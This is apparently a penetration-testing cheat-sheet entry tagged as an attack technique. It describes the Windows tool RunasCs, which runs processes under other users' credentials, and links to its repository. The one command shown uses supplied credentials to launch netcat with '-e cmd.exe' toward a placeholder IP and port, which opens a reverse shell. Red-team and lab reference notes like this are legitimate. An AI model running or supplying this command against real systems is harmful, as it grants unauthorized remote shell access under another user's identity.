# RunasCs

% windows, impersonation

#plateform/windows #target/local  #cat/ATTACK
## _desc
```
RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. solve many runas limits. Works both if spawned from interactive process and from service process
```

## _repo
```
https://github.com/antonioCoco/RunasCs
```

## _doc
```
https://github.com/antonioCoco/RunasCs
```

## _install
```
```



## Invoke-RunAs 
```powershell
RunasCs.exe <user> <password> 'cmd /c c:\tmp\nc64.exe <ip> <port> -e cmd.exe'
```
